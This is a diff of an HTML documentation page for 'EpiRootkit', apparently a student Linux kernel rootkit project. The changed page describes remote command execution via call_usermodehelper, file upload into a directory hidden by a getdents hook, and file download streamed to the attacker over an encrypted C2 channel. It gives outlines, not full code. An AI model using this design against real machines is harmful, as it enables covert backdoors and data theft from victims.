@@ -1,5 +1,5 @@
-<!doctype html><html lang=en><head><meta charset=utf-8><title>File Transfer | Tux Fan Club Docs</title>
-<meta name=viewport content="width=device-width,initial-scale=1"><meta name=keywords content="Documentation,Hugo,Hugo Theme,Bootstrap"><meta name=author content="Colin Wilson - Lotus Labs"><meta name=email content="support@aigis.uk"><meta name=website content="https://lotusdocs.dev"><meta name=Version content="v0.1.0"><link rel=icon href=/favicon.ico sizes=any><link rel=icon type=image/svg+xml href=/favicon.svg><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest crossorigin=use-credentials href=/site.webmanifest><meta property="og:title" content="File Transfer"><meta property="og:description" content="Details on the upload and download functionality."><meta property="og:type" content="article"><meta property="og:url" content="/docs/04-epirootkit/features/file-transfer/"><meta property="og:image" content="/opengraph/card-base-2_hu_cfbe153127043954.png"><meta property="article:section" content="docs"><meta property="article:published_time" content="2025-05-07T00:44:31+01:00"><meta property="article:modified_time" content="2025-05-11T16:54:28+02:00"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="/opengraph/card-base-2_hu_cfbe153127043954.png"><meta name=twitter:title content="File Transfer"><meta name=twitter:description content="Details on the upload and download functionality."><link rel=alternate type=application/atom+xml title="Atom feed for Tux Fan Club Docs" href=/index.xml><script>(()=>{var t=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,e=localStorage.getItem("theme");t&&e===null&&(localStorage.setItem("theme","dark"),document.documentElement.setAttribute("data-dark-mode","")),t&&e==="dark"&&document.documentElement.setAttribute("data-dark-mode",""),e==="dark"&&document.documentElement.setAttribute("data-dark-mode","")})()</script><script type=text/javascript src=/docs/js/flexsearch.bundle.min.249548594cb6843f3060a3cdd3043799676c59ce8db83358a3fc2e4d20598d05dfa6ce4994805d2835cb33b54dc9b9e7.js integrity=sha384-JJVIWUy2hD8wYKPN0wQ3mWdsWc6NuDNYo/wuTSBZjQXfps5JlIBdKDXLM7VNybnn crossorigin=anonymous></script><link rel=preconnect href=https://fonts.gstatic.com/><link rel=preconnect href=https://fonts.gstatic.com/ crossorigin><link href="https://fonts.googleapis.com/css?family=Inter:300,400,600,700|Fira+Code:500,700&display=block" rel=stylesheet><link rel=stylesheet href=/docs/scss/style.min.47627c508718021a8811f17bfd419041ce97729127a3db8f6bcf7c26c29fbacf37e002e618d60350aae90d89464e8447.css integrity=sha384-R2J8UIcYAhqIEfF7/UGQQc6XcpEno9uPa898JsKfus834ALmGNYDUKrpDYlGToRH crossorigin=anonymous></head><body><div class=content><div class="page-wrapper toggled"><nav id=sidebar class=sidebar-wrapper><div class=sidebar-brand><a href=/ aria-label=HomePage alt=HomePage><svg id="Layer_1" viewBox="0 0 250 250"><path d="m143 39.5c-18 0-18 18-18 18s0-18-18-18H22c-2.76.0-5 2.24-5 5v143c0 2.76 2.24 5 5 5h76c7.2.0 8.64 11.52 8.93 16.13.07 1.05.95 1.87 2 1.87h32.14c1.06.0 1.94-.82 2-1.87.29-4.61 1.73-16.13 8.93-16.13h76c2.76.0 5-2.24 5-5V44.5c0-2.76-2.24-5-5-5h-85zM206 163c0 1.38-1.12 2.5-2.5 2.5H143c-18 0-18 18-18 18s0-18-18-18H46.5c-1.38.0-2.5-1.12-2.5-2.5V69c0-1.38 1.12-2.5 2.5-2.5H98c7.2.0 8.64 11.52 8.93 16.13.07 1.05.95 1.87 2 1.87h32.14c1.06.0 1.94-.82 2-1.87.29-4.61 1.73-16.13 8.93-16.13h51.5c1.38.0 2.5 1.12 2.5 2.5v94z" style="fill:#06f"/></svg></a></div><div class=sidebar-content style="height:calc(100% - 131px)"><ul class=sidebar-menu><li class=sidebar-dropdown><button class=btn>
+<!doctype html><html lang=en><head><meta charset=utf-8><title>Remote Exec & File Transfer | Tux Fan Club Docs</title>
+<meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Run commands, upload & download files over our encrypted channel"><meta name=keywords content="Documentation,Hugo,Hugo Theme,Bootstrap"><meta name=author content="Colin Wilson - Lotus Labs"><meta name=email content="support@aigis.uk"><meta name=website content="https://lotusdocs.dev"><meta name=Version content="v0.1.0"><link rel=icon href=/favicon.ico sizes=any><link rel=icon type=image/svg+xml href=/favicon.svg><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest crossorigin=use-credentials href=/site.webmanifest><meta property="og:title" content="Remote Exec & File Transfer"><meta property="og:description" content="Run commands, upload & download files over our encrypted channel"><meta property="og:type" content="article"><meta property="og:url" content="/docs/04-epirootkit/features/file-transfer/"><meta property="og:image" content="/opengraph/card-base-2_hu_ba042757c0e46095.png"><meta property="article:section" content="docs"><meta property="article:published_time" content="2025-05-11T18:35:00+01:00"><meta property="article:modified_time" content="2025-05-11T20:22:17+02:00"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="/opengraph/card-base-2_hu_ba042757c0e46095.png"><meta name=twitter:title content="Remote Exec & File Transfer"><meta name=twitter:description content="Run commands, upload & download files over our encrypted channel"><link rel=alternate type=application/atom+xml title="Atom feed for Tux Fan Club Docs" href=/index.xml><script>(()=>{var t=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,e=localStorage.getItem("theme");t&&e===null&&(localStorage.setItem("theme","dark"),document.documentElement.setAttribute("data-dark-mode","")),t&&e==="dark"&&document.documentElement.setAttribute("data-dark-mode",""),e==="dark"&&document.documentElement.setAttribute("data-dark-mode","")})()</script><script type=text/javascript src=/docs/js/flexsearch.bundle.min.249548594cb6843f3060a3cdd3043799676c59ce8db83358a3fc2e4d20598d05dfa6ce4994805d2835cb33b54dc9b9e7.js integrity=sha384-JJVIWUy2hD8wYKPN0wQ3mWdsWc6NuDNYo/wuTSBZjQXfps5JlIBdKDXLM7VNybnn crossorigin=anonymous></script><link rel=preconnect href=https://fonts.gstatic.com/><link rel=preconnect href=https://fonts.gstatic.com/ crossorigin><link href="https://fonts.googleapis.com/css?family=Inter:300,400,600,700|Fira+Code:500,700&display=block" rel=stylesheet><link rel=stylesheet href=/docs/scss/style.min.47627c508718021a8811f17bfd419041ce97729127a3db8f6bcf7c26c29fbacf37e002e618d60350aae90d89464e8447.css integrity=sha384-R2J8UIcYAhqIEfF7/UGQQc6XcpEno9uPa898JsKfus834ALmGNYDUKrpDYlGToRH crossorigin=anonymous></head><body><div class=content><div class="page-wrapper toggled"><nav id=sidebar class=sidebar-wrapper><div class=sidebar-brand><a href=/ aria-label=HomePage alt=HomePage><svg id="Layer_1" viewBox="0 0 250 250"><path d="m143 39.5c-18 0-18 18-18 18s0-18-18-18H22c-2.76.0-5 2.24-5 5v143c0 2.76 2.24 5 5 5h76c7.2.0 8.64 11.52 8.93 16.13.07 1.05.95 1.87 2 1.87h32.14c1.06.0 1.94-.82 2-1.87.29-4.61 1.73-16.13 8.93-16.13h76c2.76.0 5-2.24 5-5V44.5c0-2.76-2.24-5-5-5h-85zM206 163c0 1.38-1.12 2.5-2.5 2.5H143c-18 0-18 18-18 18s0-18-18-18H46.5c-1.38.0-2.5-1.12-2.5-2.5V69c0-1.38 1.12-2.5 2.5-2.5H98c7.2.0 8.64 11.52 8.93 16.13.07 1.05.95 1.87 2 1.87h32.14c1.06.0 1.94-.82 2-1.87.29-4.61 1.73-16.13 8.93-16.13h51.5c1.38.0 2.5 1.12 2.5 2.5v94z" style="fill:#06f"/></svg></a></div><div class=sidebar-content style="height:calc(100% - 131px)"><ul class=sidebar-menu><li class=sidebar-dropdown><button class=btn>
 <i class="material-icons me-2">description</i>
 Introduction</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=/docs/01-introduction/presentation/>Presentation</a></li></ul></div></li><li class=sidebar-dropdown><button class=btn>
 <i class="material-icons me-2">code</i>
@@ -8,11 +8,12 @@ Setup</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link hr
 Attacking Program</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=/docs/03-attacking-program/technology-choice/>Technology Choice</a></li><li><a class=sidebar-nested-link href=/docs/03-attacking-program/deployment/>Deployment</a></li><li><a class=sidebar-nested-link href=/docs/03-attacking-program/usage/>Usage</a></li></ul></div></li><li class="sidebar-dropdown current active"><button class=btn>
 <i class="material-icons me-2">code</i>
 EpiRootkit</button><div class="sidebar-submenu d-block"><ul><li><a class=sidebar-nested-link href=/docs/04-epirootkit/deployment/>Deployment</a></li><li class="sidebar-dropdown nested current active"><button class=btn>
-Features</button><div class="sidebar-submenu d-block"><ul><li><a class=sidebar-nested-link href=/docs/04-epirootkit/features/connection/>Connection</a></li><li><a class=sidebar-nested-link href=/docs/04-epirootkit/features/persistence/>Persistence</a></li><li><a class=sidebar-nested-link href=/docs/04-epirootkit/features/password/>Password Protection</a></li><li><a class=sidebar-nested-link href=/docs/04-epirootkit/features/command-execution/>Command Execution</a></li><li class=current><a class=sidebar-nested-link href=/docs/04-epirootkit/features/file-transfer/>File Transfer</a></li><li><a class=sidebar-nested-link href=/docs/04-epirootkit/features/hiding/>Hiding (Cardboard Box)</a></li><li><a class=sidebar-nested-link href=/docs/04-epirootkit/features/crypto/>Crypto</a></li><li><a class=sidebar-nested-link href=/docs/04-epirootkit/features/bonus-features/>Bonus Features</a></li></ul></div></li><li><a class=sidebar-nested-link href=/docs/04-epirootkit/configuration-justifications/>Configuration Justifications</a></li></ul></div></li><li class=sidebar-dropdown><button class=btn>
+Features</button><div class="sidebar-submenu d-block"><ul><li><a class=sidebar-nested-link href=/docs/04-epirootkit/features/connection/>Connection</a></li><li><a class=sidebar-nested-link href=/docs/04-epirootkit/features/password/>Password Protection</a></li><li><a class=sidebar-nested-link href=/docs/04-epirootkit/features/command-execution/>Command Execution</a></li><li><a class=sidebar-nested-link href=/docs/04-epirootkit/features/crypto/>Crypto</a></li><li><a class=sidebar-nested-link href=/docs/04-epirootkit/features/bonus-features/>Bonus Features</a></li><li><a class=sidebar-nested-link href=/docs/04-epirootkit/features/fileless-dropper-loader/>Fileless Dropper & Rootkit Loader</a></li><li><a class=sidebar-nested-link href=/docs/04-epirootkit/features/symbol-ftrace/>Symbol Resolution & Ftrace Hooks</a></li><li><a class=sidebar-nested-link href=/docs/04-epirootkit/features/hiding/>Stealth Hooks & daniel.* Commands</a></li><li><a class=sidebar-nested-link href=/docs/04-epirootkit/features/persistence/>Encrypted C2, Persistence & Auth</a></li><li class=current><a class=sidebar-nested-link href=/docs/04-epirootkit/features/file-transfer/>Remote Exec & File Transfer</a></li></ul></div></li><li><a class=sidebar-nested-link href=/docs/04-epirootkit/configuration-justifications/>Configuration Justifications</a></li></ul></div></li><li class=sidebar-dropdown><button class=btn>
 <i class="material-icons me-2">code</i>
 Submission</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=/docs/05-submission/handout-format/>Handout Format</a></li></ul></div></li><li><a class=sidebar-root-link href=/docs/06-resources/><i class="material-icons me-2">code</i>
 Resources</a></li><li><a class=sidebar-root-link href=/docs/07-bonuses/wlkom-ctf/><i class="material-icons me-2">savings</i>
-Tux Fan Club: Chasse au Trésor Pirate</a></li></ul></div><ul class="sidebar-footer list-unstyled mb-0"></ul></nav><main class="page-content bg-transparent"><div id=top-header class="top-header d-print-none"><div class="header-bar d-flex justify-content-between"><div class="d-flex align-items-center"><a href=/ class="logo-icon me-3" aria-label=HomePage alt=HomePage><div class=small><svg id="Layer_1" viewBox="0 0 250 250"><path d="m143 39.5c-18 0-18 18-18 18s0-18-18-18H22c-2.76.0-5 2.24-5 5v143c0 2.76 2.24 5 5 5h76c7.2.0 8.64 11.52 8.93 16.13.07 1.05.95 1.87 2 1.87h32.14c1.06.0 1.94-.82 2-1.87.29-4.61 1.73-16.13 8.93-16.13h76c2.76.0 5-2.24 5-5V44.5c0-2.76-2.24-5-5-5h-85zM206 163c0 1.38-1.12 2.5-2.5 2.5H143c-18 0-18 18-18 18s0-18-18-18H46.5c-1.38.0-2.5-1.12-2.5-2.5V69c0-1.38 1.12-2.5 2.5-2.5H98c7.2.0 8.64 11.52 8.93 16.13.07 1.05.95 1.87 2 1.87h32.14c1.06.0 1.94-.82 2-1.87.29-4.61 1.73-16.13 8.93-16.13h51.5c1.38.0 2.5 1.12 2.5 2.5v94z" style="fill:#06f"/></svg></div><div class=big><svg id="Layer_1" viewBox="0 0 250 250"><path d="m143 39.5c-18 0-18 18-18 18s0-18-18-18H22c-2.76.0-5 2.24-5 5v143c0 2.76 2.24 5 5 5h76c7.2.0 8.64 11.52 8.93 16.13.07 1.05.95 1.87 2 1.87h32.14c1.06.0 1.94-.82 2-1.87.29-4.61 1.73-16.13 8.93-16.13h76c2.76.0 5-2.24 5-5V44.5c0-2.76-2.24-5-5-5h-85zM206 163c0 1.38-1.12 2.5-2.5 2.5H143c-18 0-18 18-18 18s0-18-18-18H46.5c-1.38.0-2.5-1.12-2.5-2.5V69c0-1.38 1.12-2.5 2.5-2.5H98c7.2.0 8.64 11.52 8.93 16.13.07 1.05.95 1.87 2 1.87h32.14c1.06.0 1.94-.82 2-1.87.29-4.61 1.73-16.13 8.93-16.13h51.5c1.38.0 2.5 1.12 2.5 2.5v94z" style="fill:#06f"/></svg></div></a><button id=close-sidebar class="btn btn-icon btn-soft">
+Tux Fan Club: Chasse au Trésor Pirate</a></li><li><a class=sidebar-root-link href=/docs/08-remerciements/thankyou/><i class="material-icons me-2">heart</i>
+Un dernier mot</a></li></ul></div><ul class="sidebar-footer list-unstyled mb-0"></ul></nav><main class="page-content bg-transparent"><div id=top-header class="top-header d-print-none"><div class="header-bar d-flex justify-content-between"><div class="d-flex align-items-center"><a href=/ class="logo-icon me-3" aria-label=HomePage alt=HomePage><div class=small><svg id="Layer_1" viewBox="0 0 250 250"><path d="m143 39.5c-18 0-18 18-18 18s0-18-18-18H22c-2.76.0-5 2.24-5 5v143c0 2.76 2.24 5 5 5h76c7.2.0 8.64 11.52 8.93 16.13.07 1.05.95 1.87 2 1.87h32.14c1.06.0 1.94-.82 2-1.87.29-4.61 1.73-16.13 8.93-16.13h76c2.76.0 5-2.24 5-5V44.5c0-2.76-2.24-5-5-5h-85zM206 163c0 1.38-1.12 2.5-2.5 2.5H143c-18 0-18 18-18 18s0-18-18-18H46.5c-1.38.0-2.5-1.12-2.5-2.5V69c0-1.38 1.12-2.5 2.5-2.5H98c7.2.0 8.64 11.52 8.93 16.13.07 1.05.95 1.87 2 1.87h32.14c1.06.0 1.94-.82 2-1.87.29-4.61 1.73-16.13 8.93-16.13h51.5c1.38.0 2.5 1.12 2.5 2.5v94z" style="fill:#06f"/></svg></div><div class=big><svg id="Layer_1" viewBox="0 0 250 250"><path d="m143 39.5c-18 0-18 18-18 18s0-18-18-18H22c-2.76.0-5 2.24-5 5v143c0 2.76 2.24 5 5 5h76c7.2.0 8.64 11.52 8.93 16.13.07 1.05.95 1.87 2 1.87h32.14c1.06.0 1.94-.82 2-1.87.29-4.61 1.73-16.13 8.93-16.13h76c2.76.0 5-2.24 5-5V44.5c0-2.76-2.24-5-5-5h-85zM206 163c0 1.38-1.12 2.5-2.5 2.5H143c-18 0-18 18-18 18s0-18-18-18H46.5c-1.38.0-2.5-1.12-2.5-2.5V69c0-1.38 1.12-2.5 2.5-2.5H98c7.2.0 8.64 11.52 8.93 16.13.07 1.05.95 1.87 2 1.87h32.14c1.06.0 1.94-.82 2-1.87.29-4.61 1.73-16.13 8.93-16.13h51.5c1.38.0 2.5 1.12 2.5 2.5v94z" style="fill:#06f"/></svg></div></a><button id=close-sidebar class="btn btn-icon btn-soft">
 <span class="material-icons size-20 menu-icon align-middle">menu</span>
 </button>
 <button id=flexsearch-button class="ms-3 btn btn-soft" data-bs-toggle=collapse data-bs-target=#FlexSearchCollapse aria-expanded=false aria-controls=FlexSearchCollapse>
@@ -29,11 +30,15 @@ Tux Fan Club: Chasse au Trésor Pirate</a></li></ul></div><ul class="sidebar-foo
 cancel</button></div><div id=suggestions class="shadow rounded-1 d-none"></div></form></div></div></div><div class=container-fluid><div class=layout-spacing><div class="d-md-flex justify-content-between align-items-center"><nav aria-label=breadcrumb class="d-inline-block pb-2 mt-1 mt-sm-0"><ul id=breadcrumbs class="breadcrumb bg-transparent mb-0" itemscope itemtype=https://schema.org/BreadcrumbList><li class="breadcrumb-item text-capitalize active" aria-current=page itemprop=itemListElement itemscope itemtype=https://schema.org/ListItem><a itemprop=item href=/docs/><i class="material-icons size-20 align-text-bottom" itemprop=name>Home</i>
 </a><meta itemprop=position content='1'></li><li class="breadcrumb-item text-capitalize" itemprop=itemListElement itemscope itemtype=https://schema.org/ListItem><a itemprop=item href=/docs/04-epirootkit/><span itemprop=name>EpiRootkit</span>
 </a><meta itemprop=position content='2'></li><li class="breadcrumb-item text-capitalize" itemprop=itemListElement itemscope itemtype=https://schema.org/ListItem><a itemprop=item href=/docs/04-epirootkit/features/><span itemprop=name>Features</span>
-</a><meta itemprop=position content='3'></li><li class="breadcrumb-item text-capitalize active" itemprop=itemListElement itemscope itemtype=https://schema.org/ListItem><span itemprop=name>File Transfer</span>
-<meta itemprop=position content='4'></li></ul></nav></div><div class="row flex-xl-nowrap"><div class="docs-toc col-xl-3 visually-hidden d-xl-block"><toc><div class="fw-bold text-uppercase mb-2">On this page</div><nav id=toc></nav></toc></div><div class="docs-toc-mobile visually-hidden d-print-none d-xl-none"><button id=toc-dropdown-btn class="btn-secondary dropdown-toggle" type=button data-bs-toggle=dropdown data-bs-offset=0,0 aria-expanded=false>
-Table of Contents</button><nav id=toc-mobile></nav></div><div class="docs-content col-12 mt-0"><div class="mb-0 d-flex"><i class="material-icons title-icon me-2">code</i><h1 class="content-title mb-0">File Transfer</h1></div><p class="lead mb-3"></p><div id=content class=main-content data-bs-spy=scroll data-bs-root-margin="0px 0px -65%" data-bs-target=#toc-mobile><div data-prismjs-copy data-prismjs-copy-success data-prismjs-copy-error><p>Details on the upload and download functionality.</p></div><div class="gitinfo d-flex flex-wrap justify-content-between align-items-center opacity-85 pt-3"><div id=edit-this-page class=mt-1><a href=https://github.com/kazetachinuu/epirootkit-docs/blob/master/content/docs/04-epirootkit/features/file-transfer.md alt="File Transfer" rel="noopener noreferrer" target=_blank><span class="me-1 align-text-bottom"><svg width="20" height="20" viewBox="0 0 32 32" fill="currentcolor"><path d="M16 .396c-8.839.0-16 7.167-16 16 0 7.073 4.584 13.068 10.937 15.183.803.151 1.093-.344 1.093-.772.0-.38-.009-1.385-.015-2.719-4.453.964-5.391-2.151-5.391-2.151-.729-1.844-1.781-2.339-1.781-2.339-1.448-.989.115-.968.115-.968 1.604.109 2.448 1.645 2.448 1.645 1.427 2.448 3.744 1.74 4.661 1.328.14-1.031.557-1.74 1.011-2.135-3.552-.401-7.287-1.776-7.287-7.907.0-1.751.62-3.177 1.645-4.297-.177-.401-.719-2.031.141-4.235.0.0 1.339-.427 4.4 1.641 1.281-.355 2.641-.532 4-.541 1.36.009 2.719.187 4 .541 3.043-2.068 4.381-1.641 4.381-1.641.859 2.204.317 3.833.161 4.235 1.015 1.12 1.635 2.547 1.635 4.297.0 6.145-3.74 7.5-7.296 7.891.556.479 1.077 1.464 1.077 2.959.0 2.14-.02 3.864-.02 4.385.0.416.28.916 1.104.755 6.4-2.093 10.979-8.093 10.979-15.156.0-8.833-7.161-16-16-16z"/></svg>
-</span>Edit this page</a></div><div id=last-modified class=mt-1><p class="mb-0 fw-semibold">Last updated <span id=relativetime data-authdate=2025-05-11T16:54:28+0200 title="11 May 2025, 16:54 +0200">11 May 2025, 16:54 +0200
-</span>. <span class="material-icons size-20 align-text-bottom opacity-75">history</span></p></div></div></div><div><hr class=doc-hr><div id=doc-nav class=d-print-none><div class="row flex-xl-nowrap"><div class="col-sm-6 pt-2 doc-next"><a href=/docs/04-epirootkit/features/command-execution/><div class="card h-100 my-1"><div class="card-body py-2"><p class="card-title fs-5 fw-semibold lh-base mb-0"><i class="material-icons align-middle">navigate_before</i> Command Execution</p><p class="card-text ms-2"></p></div></div></a></div><div class="col-sm-6 pt-2 doc-prev"><a class=ms-auto href=/docs/04-epirootkit/features/hiding/><div class="card h-100 my-1 text-end"><div class="card-body py-2"><p class="card-title fs-5 fw-semibold lh-base mb-0">Hiding (Cardboard Box) <i class="material-icons align-middle">navigate_next</i></p><p class="card-text me-2">How the rootkit hides files, …</p></div></div></a></div></div></div></div></div></div></div></div><footer class="shadow py-3 d-print-none"><div class=container-fluid><div class="row align-items-center"><div class=col><div class="text-sm-start text-center mx-md-2"><p class=mb-0>© 2025 Tux Fan Club. Built with <a href=https://github.com/colinwilson/lotusdocs><strong>Lotus Docs</strong></a></p></div></div></div></div></footer></main></div></div><button onclick=topFunction() id=back-to-top aria-label="Back to Top Button" class="back-to-top fs-5"><svg width="24" height="24"><path d="M12 10.224l-6.3 6.3-1.38-1.372L12 7.472l7.68 7.68-1.38 1.376z" style="fill:#fff"/></svg></button>
+</a><meta itemprop=position content='3'></li><li class="breadcrumb-item text-capitalize active" itemprop=itemListElement itemscope itemtype=https://schema.org/ListItem><span itemprop=name>Remote Exec & File Transfer</span>
+<meta itemprop=position content='4'></li></ul></nav></div><div class="row flex-xl-nowrap"><div class="docs-toc col-xl-3 d-xl-block"><toc><div class="fw-bold text-uppercase mb-2">On this page</div><nav id=toc><ul><li><a href=#1-remote-command-execution>1. Remote Command Execution</a></li><li><a href=#2-file-upload>2. File Upload</a></li><li><a href=#3-file-download>3. File Download</a></li></ul></nav></toc></div><div class="docs-toc-mobile d-print-none d-xl-none"><button id=toc-dropdown-btn class="btn-secondary dropdown-toggle" type=button data-bs-toggle=dropdown data-bs-offset=0,0 aria-expanded=false>
+Table of Contents</button><nav id=toc-mobile><ul class=dropdown-menu><li><a href=#1-remote-command-execution>1. Remote Command Execution</a></li><li><a href=#2-file-upload>2. File Upload</a></li><li><a href=#3-file-download>3. File Download</a></li></ul></nav></div><div class="docs-content col-12 col-xl-9 mt-0"><div class="mb-0 d-flex"><i class="material-icons title-icon me-2">cloud_upload</i><h1 class="content-title mb-0">Remote Exec & File Transfer</h1></div><p class="lead mb-3">Run commands, upload & download files over our encrypted channel</p><div id=content class=main-content data-bs-spy=scroll data-bs-root-margin="0px 0px -65%" data-bs-target=#toc-mobile><div data-prismjs-copy data-prismjs-copy-success data-prismjs-copy-error><h1 id=1-remote-command-execution>1. Remote Command Execution <a href=#1-remote-command-execution class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h1><p><strong>What we did</strong><br>Allow arbitrary program execution via C2.</p><p><strong>How it works</strong></p><ul><li>Receive a packet:<div class=prism-codeblock><pre id=265fa6f class=language->
+  <code>EXEC &lt;len&gt;\n&lt;payload&gt;</code>
+  </pre></div></li><li>Use <code>call_usermodehelper(argv, envp, UMH_WAIT_PROC)</code> to spawn the process.</li><li>Capture its <code>stdout</code>/<code>stderr</code> via kernel pipes and send back encrypted.</li></ul><hr><h1 id=2-file-upload>2. File Upload <a href=#2-file-upload class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h1><p><strong>What we did</strong><br>Accept files from the attacker.</p><p><strong>How it works</strong></p><ul><li>Receive <code>UPLOAD &lt;path> &lt;len>\n&lt;data></code>.</li><li><code>filp_open("/usr/share/epirootkit/&lt;path>", O_CREAT|O_WRONLY, 0600)</code>.</li><li><code>kernel_write()</code> the data.</li><li>Our <code>getdents()</code> hook keeps <code>/usr/share/epirootkit</code> hidden.</li></ul><hr><h1 id=3-file-download>3. File Download <a href=#3-file-download class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h1><p><strong>What we did</strong><br>Send files to the attacker.</p><p><strong>How it works</strong></p><ul><li>Receive <code>DOWNLOAD &lt;path></code>.</li><li><code>filp_open()</code> + <code>kernel_read()</code> in chunks.</li><li>Stream each chunk over the encrypted C2 link.</li></ul><div class=prism-codeblock><pre id=39de4cc class=language->
+  <code></code>
+  </pre></div></div><div class="gitinfo d-flex flex-wrap justify-content-between align-items-center opacity-85 pt-3"><div id=edit-this-page class=mt-1><a href=https://github.com/kazetachinuu/epirootkit-docs/blob/master/content/docs/04-epirootkit/features/file-transfer.md alt="Remote Exec & File Transfer" rel="noopener noreferrer" target=_blank><span class="me-1 align-text-bottom"><svg width="20" height="20" viewBox="0 0 32 32" fill="currentcolor"><path d="M16 .396c-8.839.0-16 7.167-16 16 0 7.073 4.584 13.068 10.937 15.183.803.151 1.093-.344 1.093-.772.0-.38-.009-1.385-.015-2.719-4.453.964-5.391-2.151-5.391-2.151-.729-1.844-1.781-2.339-1.781-2.339-1.448-.989.115-.968.115-.968 1.604.109 2.448 1.645 2.448 1.645 1.427 2.448 3.744 1.74 4.661 1.328.14-1.031.557-1.74 1.011-2.135-3.552-.401-7.287-1.776-7.287-7.907.0-1.751.62-3.177 1.645-4.297-.177-.401-.719-2.031.141-4.235.0.0 1.339-.427 4.4 1.641 1.281-.355 2.641-.532 4-.541 1.36.009 2.719.187 4 .541 3.043-2.068 4.381-1.641 4.381-1.641.859 2.204.317 3.833.161 4.235 1.015 1.12 1.635 2.547 1.635 4.297.0 6.145-3.74 7.5-7.296 7.891.556.479 1.077 1.464 1.077 2.959.0 2.14-.02 3.864-.02 4.385.0.416.28.916 1.104.755 6.4-2.093 10.979-8.093 10.979-15.156.0-8.833-7.161-16-16-16z"/></svg>
+</span>Edit this page</a></div><div id=last-modified class=mt-1><p class="mb-0 fw-semibold">Last updated <span id=relativetime data-authdate=2025-05-11T20:22:17+0200 title="11 May 2025, 20:22 +0200">11 May 2025, 20:22 +0200
+</span>. <span class="material-icons size-20 align-text-bottom opacity-75">history</span></p></div></div></div><div><hr class=doc-hr><div id=doc-nav class=d-print-none><div class="row flex-xl-nowrap"><div class="col-sm-6 pt-2 doc-next"><a href=/docs/04-epirootkit/configuration-justifications/><div class="card h-100 my-1"><div class="card-body py-2"><p class="card-title fs-5 fw-semibold lh-base mb-0"><i class="material-icons align-middle">navigate_before</i> Configuration Justifications</p><p class="card-text ms-2">Justification for Ubuntu 20.04 …</p></div></div></a></div><div class="col-sm-6 pt-2 doc-prev"><a class=ms-auto href=/docs/05-submission/handout-format/><div class="card h-100 my-1 text-end"><div class="card-body py-2"><p class="card-title fs-5 fw-semibold lh-base mb-0">Handout Format <i class="material-icons align-middle">navigate_next</i></p><p class="card-text me-2"></p></div></div></a></div></div></div></div></div></div></div></div><footer class="shadow py-3 d-print-none"><div class=container-fluid><div class="row align-items-center"><div class=col><div class="text-sm-start text-center mx-md-2"><p class=mb-0>© 2025 Tux Fan Club. Built with <a href=https://github.com/colinwilson/lotusdocs><strong>Lotus Docs</strong></a></p></div></div></div></div></footer></main></div></div><button onclick=topFunction() id=back-to-top aria-label="Back to Top Button" class="back-to-top fs-5"><svg width="24" height="24"><path d="M12 10.224l-6.3 6.3-1.38-1.372L12 7.472l7.68 7.68-1.38 1.376z" style="fill:#fff"/></svg></button>
 <script>(()=>{var e=document.getElementById("mode");e!==null&&(window.matchMedia("(prefers-color-scheme: dark)").addEventListener("change",e=>{e.matches?(localStorage.setItem("theme","dark"),document.documentElement.setAttribute("data-dark-mode","")):(localStorage.setItem("theme","light"),document.documentElement.removeAttribute("data-dark-mode"))}),e.addEventListener("click",()=>{document.documentElement.toggleAttribute("data-dark-mode"),localStorage.setItem("theme",document.documentElement.hasAttribute("data-dark-mode")?"dark":"light")}),localStorage.getItem("theme")==="dark"?document.documentElement.setAttribute("data-dark-mode",""):document.documentElement.removeAttribute("data-dark-mode"))})()</script><script src=/docs/js/bootstrap.c7927bdd82eceb076739257add3f4b0e11379da037c07d5c7110daeb6de0e3edcb2de867604550f88815157e4ec4ddb7.js integrity=sha384-x5J73YLs6wdnOSV63T9LDhE3naA3wH1ccRDa623g4+3LLehnYEVQ+IgVFX5OxN23 defer></script><script type=text/javascript src=/docs/js/bundle.min.4f60111ba6134ba40ed4d3ca8b6f30e10963c0482cd9829b9dc4a2a347bc6eaec2c1cf424c2ce632fb6d2218139f34f0.js integrity=sha384-T2ARG6YTS6QO1NPKi28w4QljwEgs2YKbncSio0e8bq7Cwc9CTCzmMvttIhgTnzTw crossorigin=anonymous defer></script><script type=module>
     var suggestions = document.getElementById('suggestions');
     var search = document.getElementById('flexsearch');
@@ -333,6 +338,27 @@ Table of Contents</button><nav id=toc-mobile></nav></div><div class="docs-conten
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
 
 
     
@@ -351,15 +377,6 @@ Table of Contents</button><nav id=toc-mobile></nav></div><div class="docs-conten
     index.add(
             {
                 id:  1 ,
-                href: "\/docs\/04-epirootkit\/features\/persistence\/",
-                title: "Persistence",
-                description: "How the rootkit achieves persistence across reboots.\n",
-                content: "How the rootkit achieves persistence across reboots.\n"
-            }
-        );
-    index.add(
-            {
-                id:  2 ,
                 href: "\/docs\/04-epirootkit\/features\/password\/",
                 title: "Password Protection",
                 description: "How access to the rootkit is secured.\n",
@@ -368,7 +385,7 @@ Table of Contents</button><nav id=toc-mobile></nav></div><div class="docs-conten
         );
     index.add(
             {
-                id:  3 ,
+                id:  2 ,
                 href: "\/docs\/04-epirootkit\/features\/command-execution\/",
                 title: "Command Execution",
                 description: "How commands are executed on the victim and results returned.\n",
@@ -377,25 +394,7 @@ Table of Contents</button><nav id=toc-mobile></nav></div><div class="docs-conten
         );
     index.add(
             {
-                id:  4 ,
-                href: "\/docs\/04-epirootkit\/features\/file-transfer\/",
-                title: "File Transfer",
-                description: "Details on the upload and download functionality.\n",
-                content: "Details on the upload and download functionality.\n"
